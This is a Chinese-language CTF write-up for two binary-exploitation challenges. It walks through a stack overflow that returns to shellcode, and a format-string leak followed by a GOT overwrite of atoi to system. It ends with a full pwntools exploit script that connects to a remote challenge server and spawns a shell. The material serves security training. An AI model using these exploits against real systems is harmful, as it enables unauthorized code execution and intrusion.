2. repeater[N1]

repeater

分析

checksec输出：

Arch:     amd64
RELRO:      Full RELRO #GOT只读
Stack:      No canary found #栈溢出保护未开
NX:         NX unknown - GNU_STACK missing
PIE:        PIE enabled #地址随机化
Stack:      Executable #栈可执行
RWX:        Has RWX segments

栈可执行，大概率要写入shellcode，开启了PIE，需要泄露main函数地址 IDA查看 没有后门，那就要写入shellcode然后利用栈溢出执行了

sub_982(s_, 48);可以将shellcode写入s_地址，也就是最后需要ret的地址

shellcode = asm(shellcraft.sh())
r.sendlineafter(b"name :", shellcode)

for循环处有一个read，Tab键查看写入的地址

lea     rax, [rbp-30h]
mov     edx, 40h
mov     rsi, rax
mov     edi, 0
call    _read

再看n1192227的写入地址

mov     dword ptr [rbp-10h], 123123h

中间相隔0x20，需要覆盖这段地址，然后往n1192227写入3281697使if语句成立泄露main函数地址

num = 3281697
payload = b"a" * 0x20 + p64(num)
r.sendlineafter(b"input :", payload)
data = r.recvuntil(b"you :\n") #puts函数自带\n
main_addr = int(r.recv(14),16) #返回0x12字节，加上0x需要接收12+2个字节
success(main_addr)

最后要将shellcode写入栈，结束for循环，执行shellocde

只要将n1192227写入1即可结束循环

shellcode_addr = main_addr + 0x202040 - 0xA33 #0x202040 - 0xA33是shellcode写入的地址和main函数的偏移，真实地址 + 偏移 = shellcode地址
payload = b"a" * 0x20 + p64(0x1) + b"a" * 0x10 + p64(shellcode_addr) #写入b"a" * 0x10而不是0x10+8，因为前面已经写入了p64(0x1)，相当于把+8前置，b"a" * 0x10已经覆盖了ebp
r.sendlineafter(b"input :", payload)

3. new-easypwn[N1]

new-easypwn

Arch:     amd64
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled

载入IDA，发现是一个通讯录小程序，对于输入的值执行对应的函数

查看各个函数功能，不难发现在Show函数中，存在格式化字符串漏洞，可以泄露地址 可以把要泄露的地址写入ADD函数中

先查看格式化字符串漏洞输出的地址，可以通过gdb断点printf，一个一个跑 可以看到第9和第13个地址分别是main + 0x1274的地址和__libc_start_main + 240的地址

  1. 为什么从第六开始数？ 因为x64程序前5个参数写入寄存器
  2. 为什么判断第9个地址是main+0x1274？ 因为rbp后的地址为返回地址，就是执行完printf后的返回地址，正好返回了main函数调用函数的地址，再减去1274就是main函数的base_addr
  1. 泄露地址
ADD(b'%13$p %9$p',b'aaaaaaaa',b'15',b'12345678')
Show(b'0')
r.recvuntil(b'0x')
libc_start_main = int(r.recv(12),16) - 240
r.recvuntil(b'0x')
main_addr = int(r.recv(12),16) - 0x1274
  1. 计算偏移
libc_start_main_base = libc_start_main - libc.symbol['__libc_start_main']
system_addr = libc_start_main_base + libc.symbol['system']
  1. 将system函数地址写入atoi@got表
atoi_got = elf.got['atoi']
Edit(b'0',b'c' * 11 + b'c' * 13 + p64(atoi_got) , p64(system_addr))

为什么使用b’c’ * 13 + p64(atoi_got) , p64(system_addr) 如图所示，将atoi_got的地址写入des_info，然后修改为system_addr，这样atoi_got的地址就被修改为system_addr了

exp 

from pwn import *

context.arch = 'amd64'
# r = process("./hello")
elf = ELF("./hello")
libc = ELF('libc-2.23.so')

r = remote('61.147.171.105',61758)

def ADD(number,name,size,info):
    r.sendlineafter("choice>>",b'1')
    r.sendlineafter("number:",number)
    r.sendlineafter("name:",name)
    r.sendlineafter("size:",size)
    r.sendlineafter("info:",info)

def Show(index):
    r.sendlineafter("choice>>",b'3')
    r.sendlineafter("index:",index)

def Edit(index,number,name,info):
    r.sendlineafter("choice>>",b'4')
    r.sendlineafter("index:",index)
    r.sendlineafter("number:",number)
    r.sendlineafter("name:",name)
    r.sendlineafter("info:",info)

ADD(b'%13$p%9$p',b'aaaaaaaa',b'15',b'12345678')
Show(b'0')
r.recvuntil(b'0x')
libc_start_main = int(r.recv(12),16) - 240
r.recvuntil(b'0x')
main_addr = int(r.recv(12),16) - 0x1274
libc_start_main_base = libc_start_main - libc.symbols['__libc_start_main']
system_addr = libc_start_main_base + libc.symbols['system']
atoi_got = main_addr + elf.got['atoi']
Edit(b'0',b'c' * 11 , b'c' * 13 + p64(atoi_got) , p64(system_addr))

r.sendlineafter(">>",b'/bin/sh')

r.interactive()
